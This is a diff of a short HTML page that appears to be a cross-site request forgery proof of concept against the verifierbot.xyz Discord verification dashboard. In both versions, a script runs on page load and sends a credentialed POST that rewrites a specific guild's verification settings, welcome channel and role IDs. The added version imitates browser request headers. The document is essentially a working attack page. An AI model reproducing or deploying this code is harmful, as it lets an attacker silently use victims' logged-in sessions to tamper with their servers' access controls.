@@ -1,57 +1,28 @@
-<!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Automatic JSON Form Submission</title>
+<script>
+fetch("https://verifierbot.xyz/api/@me/guilds/1107681604878487634/verification", {
+  "headers": {
+    "accept": "*/*",
+    "accept-language": "en-US,en;q=0.9",
+    "content-type": "application/json",
+    "priority": "u=1, i",
+    "sec-ch-ua": "\"Chromium\";v=\"121\", \"Not A(Brand\";v=\"99\"",
+    "sec-ch-ua-mobile": "?0",
+    "sec-ch-ua-platform": "\"Windows\"",
+    "sec-fetch-dest": "empty",
+    "sec-fetch-mode": "cors",
+    "sec-fetch-site": "same-origin",
+    "token": "undefined"
+  },
+  "referrer": "https://verifierbot.xyz/dashboard/1107681604878487634/verification",
+  "referrerPolicy": "strict-origin-when-cross-origin",
+  "body": "{\"welcomeMessage\":\"h\",\"welcomeChannelID\":\"1107681605432127630\",\"unverifiedRole\":[\"1107681604878487634\"],\"verifiedRoles\":[\"1202354378321965126\",\"\",\"\"],\"verificationType\":\"web\",\"emoji\":{\"name\":\"😀\"}}",
+  "method": "POST",
+  "mode": "cors",
+  "credentials": "include"
+});
+</script>
 </head>
-<body>
-
-  <script>
-    document.addEventListener('DOMContentLoaded', function() {
-      // Form data object
-      var formData = {
-        welcomeMessage: "h",
-        welcomeChannelID: "1107681605432127630",
-        unverifiedRole: ["1107681604878487634"],
-        verifiedRoles: ["1202354378321965126", "", ""],
-        verificationType: "web",
-        emoji: {
-          name: "😀"
-        }
-      };
-
-      // Convert form data to JSON
-      var jsonData = JSON.stringify(formData);
-
-      // Fetch options
-      var fetchOptions = {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'token': 'undefined' // Replace with your actual token if needed
-        },
-        body: jsonData,
-        mode: 'cors',
-        credentials: 'include'
-      };
-
-      // Fetch request
-      fetch('https://verifierbot.xyz/api/@me/guilds/1107681604878487634/verification', fetchOptions)
-        .then(response => {
-          if (!response.ok) {
-            throw new Error('Network response was not ok');
-          }
-          return response.json();
-        })
-        .then(data => {
-          console.log(data); // Handle the response data as needed
-        })
-        .catch(error => {
-          console.error('Error:', error);
-        });
-    });
-  </script>
-
-</body>
+<body>test</body>
 </html>
